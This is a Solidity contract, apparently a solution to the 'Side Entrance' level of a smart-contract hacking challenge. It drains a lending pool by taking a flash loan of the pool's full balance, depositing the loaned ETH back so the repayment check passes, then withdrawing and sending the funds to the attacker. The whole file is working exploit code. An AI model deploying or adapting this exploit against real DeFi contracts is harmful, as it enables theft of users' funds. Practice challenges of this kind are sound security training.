// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract AttackSideEntrance {
    SideEntranceLenderPool pool;
    uint256 ethAvailable;
    address payable owner;

    constructor(address _poolAddress) {
        pool = SideEntranceLenderPool(_poolAddress);
        ethAvailable = _poolAddress.balance;
        owner = payable(msg.sender);
    }

    function attack() public {
        pool.flashLoan(ethAvailable);
        pool.withdraw();
        owner.transfer(address(this).balance);
    }

    function execute() public payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
